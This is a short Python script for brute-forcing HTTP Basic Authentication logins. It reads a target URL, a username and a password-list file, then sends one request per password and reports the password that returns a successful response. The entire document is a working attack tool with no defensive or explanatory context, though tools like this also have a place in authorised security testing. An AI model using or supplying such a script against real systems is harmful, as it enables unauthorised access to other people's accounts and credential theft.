#Brute forcing login through the Authorization header
import requests
from requests.auth import HTTPBasicAuth

target = input("Enter targte URL: ")
passList = input("Enter path to passlist file: ")
user = input("Enter username: ")

with open(passList) as passwords:
    for password in passwords.readlines():
        password = password.strip()
        req = requests.get(target, auth=HTTPBasicAuth(user, password))

        if req.status_code == 401:
            print("Login failed with => ", password)
        elif req.status_code == 200:
            print('Password found => ', password)
            break
        else:
            print(req.status_code, " error! ")
            break
